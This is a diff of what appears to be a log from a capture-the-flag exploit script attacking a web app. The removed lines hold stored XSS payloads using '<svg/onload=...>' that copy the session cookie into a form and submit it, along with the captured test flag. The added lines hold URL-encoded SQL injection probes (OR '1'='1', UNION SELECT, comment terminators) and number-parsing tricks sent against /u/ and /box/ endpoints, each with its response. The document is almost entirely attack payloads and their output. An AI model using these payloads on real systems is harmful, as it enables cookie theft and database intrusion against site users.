@@ -1,13 +1,31 @@
-lens 59 54 24 52
-box 298 (59): <svg/onload=f=forms.item(0);f.body.value=cookie;f.submit()>
-   chant: 'A wild cheer erupts: <svg/onload=f=forms.item(0);f.body.value=cookie;f.submit()>!'
-box 299 (54): <svg/onload=f=all.body;f.value=cookie;f.form.submit()>
-   chant: 'A wild cheer erupts: <svg/onload=f=all.body;f.value=cookie;f.form.submit()>!'
-box 300 (24): <svg/onload=name=cookie>
-   chant: 'A wild cheer erupts: <svg/onload=name=cookie>!'
-box 301 (52): <svg/onload=f=all.body;f.value=name;f.form.submit()>
-   chant: 'A wild cheer erupts: <svg/onload=f=all.body;f.value=name;f.form.submit()>!'
-BA comments:  <li><strong>@trainer01</strong> testflag=HELLO123</li> <li><strong>@trainer01</strong> testflag=HELLO123</li> <li><strong>@trainer01</strong> testfla
-BB comments:  <li><strong>@trainer01</strong> testflag=HELLO123</li> <li><strong>@trainer01</strong> testflag=HELLO123</li> <li><strong>@trainer01</strong> testfla
-name: 'testflag=HELLO123'
-BD comments:  <li><strong>@trainer01</strong> testflag=HELLO123</li> <li><strong>@trainer01</strong> testflag=HELLO123</li> <li><strong>@trainer01</strong> testflag=HELLO123</li> <li><strong>@trainer01</strong> te
+/u/ctf_bot%27%20OR%20%271%27%3D%271 -> 404 15 no such trainer
+/u/ctf_bot%27-- -> 404 15 no such trainer
+/u/ctf_bot%25%27%20OR%201%3D1-- -> 404 15 no such trainer
+/u/x%27%20UNION%20SELECT%201-- -> 404 15 no such trainer
+/u/%25%27%20OR%201%3D1-- -> 404 15 no such trainer
+/u/ctf_bot%27%20AND%20%271%27%3D%271 -> 404 15 no such trainer
+/u/ctf_bot%27%20AND%20%271%27%3D%272 -> 404 15 no such trainer
+/u/ctf_bot%2500 -> 404 15 no such trainer
+/u/%2525 -> 404 15 no such trainer
+/u/_ -> 404 15 no such trainer
+/u/%25 -> 404 15 no such trainer
+/u/%2A -> 404 15 no such trainer
+/u/ctf%25 -> 404 15 no such trainer
+/u/ctf_bot -> 200 902 <!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, in
+/home/runner/work/ctfcuppp/ctfcuppp/tools/exploit.py:19: FutureWarning: Possible nested set at position 1
+  log(f"/box/{u} -> {r.status_code} {len(r.content)} {re.sub(r'[[:space:]]+',' ',r.text[:80])}")
+/box/1%27%20OR%20%271%27%3D%271 -> 404 11 no such box
+/box/1%20OR%201%3D1 -> 404 11 no such box
+/box/1%2520OR%25201%3D1 -> 404 11 no such box
+/box/1%27-- -> 404 11 no such box
+/box/0x1 -> 404 11 no such box
+/box/%2B1 -> 200 2055 <!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="v
+/box/01 -> 200 2055 <!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="v
